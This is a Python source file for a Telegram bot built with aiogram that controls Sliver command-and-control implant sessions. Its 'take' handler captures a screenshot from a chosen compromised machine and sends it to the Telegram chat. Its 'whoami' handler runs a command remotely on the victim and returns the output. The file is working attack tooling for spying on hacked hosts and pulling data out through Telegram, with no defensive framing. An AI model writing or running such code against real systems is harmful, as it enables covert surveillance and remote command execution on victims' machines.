from aiogram import Router, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
#from notify.notify.py import extract_all_beacons
from aiogram import types
from aiogram.enums import ParseMode
import re
from aiogram.utils.formatting import Text, Bold, Code
from datetime import datetime, timezone
import copy
import config as cfg
from sliver import *
from aiogram.types import InputFile
from aiogram.types import FSInputFile
import os
import asyncio
from src import info

router = Router()
router.include_router(info.router)

logger = cfg.logger
CFG_PATH = cfg.CFG_PATH
reply_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="info")],
        [KeyboardButton(text="close")]
    ],
    resize_keyboard=True
)

@router.message(lambda msg: msg.text == "/menu")
async def show_reply_menu(message: types.Message):
    await message.answer("hi", reply_markup=reply_kb)

@router.message(lambda msg: msg.text == "close")
async def close_action(message: types.Message):
    await message.answer("menu closed", reply_markup=types.ReplyKeyboardRemove())

@router.message(lambda message: 'take' in message.text)
async def take(message: types.Message):
    match = re.search(r'take (\d)', message.text)
    id = int(match.group(1))
    print(id)
    config = SliverClientConfig.parse_config_file(CFG_PATH)
    client = SliverClient(config)
    await client.connect()
    sessions = await client.sessions()
    logger.info(sessions[id])
    session = await client.interact_session(sessions[id].ID)
    screen = await session.screenshot()

    with open("1337.png", "wb") as f:
        f.write(screen.Data)
    img_path = "1337.png"
    if os.path.exists(img_path):
        logger.error(f"file found: {img_path}")
    else:
        logger.error(f"file not found: {img_path}")
    img = FSInputFile(img_path)
    try:
        await message.answer_photo(photo=img, caption="done")
    except:
        await message.answer("error occured")

@router.message(lambda message: 'whoami' in message.text)
async def whoami(message: types.Message):
    match = re.search(r'whoami (\d)', message.text)
    id = int(match.group(1))
    print(id)
    config = SliverClientConfig.parse_config_file(CFG_PATH)
    client = SliverClient(config)
    await client.connect()
    sessions = await client.sessions()
    logger.error(sessions[id])
    session = await client.interact_session(sessions[id].ID)
    whoami = await session.execute('whoami', [], True)
    output_message = Text(Bold("output: \n"), Code(whoami))
    await message.answer(**output_message.as_kwargs())
